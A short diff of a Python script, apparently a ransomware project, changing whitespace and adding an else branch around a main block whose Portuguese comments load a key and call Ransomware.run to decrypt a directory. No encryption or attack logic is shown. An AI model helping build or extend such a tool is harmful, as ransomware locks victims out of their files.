@@ -112,6 +112,7 @@ def getArguments():
 
 # MAIN
 if __name__ == '__main__':
+    
     # Pegar os argumentos
     args = getArguments()
 
@@ -130,7 +131,9 @@ if __name__ == '__main__':
 
     # Descriptografar
     elif args.decrypt:
-        # Carregar a chave de criptografia
+        # Carregar a chave de criptografia 
         key = CryptoKey.loadKey()
         # Descriptografar os arquivos
         Ransomware.run(directory, key, "decrypt")
+else:
+    print()
